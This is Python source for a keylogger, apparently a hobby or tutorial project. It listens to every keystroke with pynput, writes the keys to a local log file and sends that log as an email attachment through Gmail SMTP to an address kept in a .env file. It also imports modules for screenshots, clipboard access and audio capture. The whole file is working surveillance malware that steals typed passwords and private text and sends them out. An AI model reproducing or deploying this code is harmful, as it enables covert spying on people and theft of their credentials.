import socket
import platform
import win32clipboard
import time
import os
import getpass
import sounddevice as sd
import smtplib
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write 
from cryptography.fernet import Fernet
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from dotenv import load_dotenv

load_dotenv(".env")

keys_information = "log.txt"
system_information = "system_information.txt"
file_path = "C:\\Users\\1337\\Desktop\\Pypros 20\\kl"
extend = "\\"

toaddr = os.getenv("toaddr")
fromaddr = os.getenv("fromaddr")
password = os.getenv("password")

count = 0
keys = []

def send_mail(filename, attachment, toaddr):

	msg = MIMEMultipart()

	msg['From'] = fromaddr
	msg['To'] = toaddr
	msg['Subject'] = 'Log Test'

	# body of the email
	body = "Body_of_the_mail"
	msg.attach(MIMEText(body, 'plain'))

	# attachment
	filename = filename
	attachment = open(attachment, 'rb')

	# base
	p = MIMEBase('application', 'octet-stream')

	# ecnode msg
	p.set_payload((attachment).read())
	encoders.encode_base64(p)

	# add header
	p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

	msg.attach(p)

	# create smtp session
	s = smtplib.SMTP('smtp.gmail.com', 587)

	# start tls & login to gmail
	s.starttls()

	s.login(fromaddr, password)

	text = msg.as_string()

	s.sendmail(fromaddr, toaddr, text)

	s.quit()

# test the email func
send_mail(keys_information, file_path + extend + keys_information, toaddr)


def on_press(key):
	global keys, count

	print(key)
	keys.append(key)
	count += 1

	if count >= 1:
		count = 0
		write_file(keys)
		keys = []

def write_file(keys):
	with open(file_path + extend + keys_information, "a") as f:
		for key in keys:
			k = str(key).replace("'", "")
			if k.find("space") > 0:
				f.write("\n")
				f.close()

			elif k.find("Key") == -1:
				f.write(k)
				f.close()

def on_release(key):
	if key == Key.esc:
		return False

with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()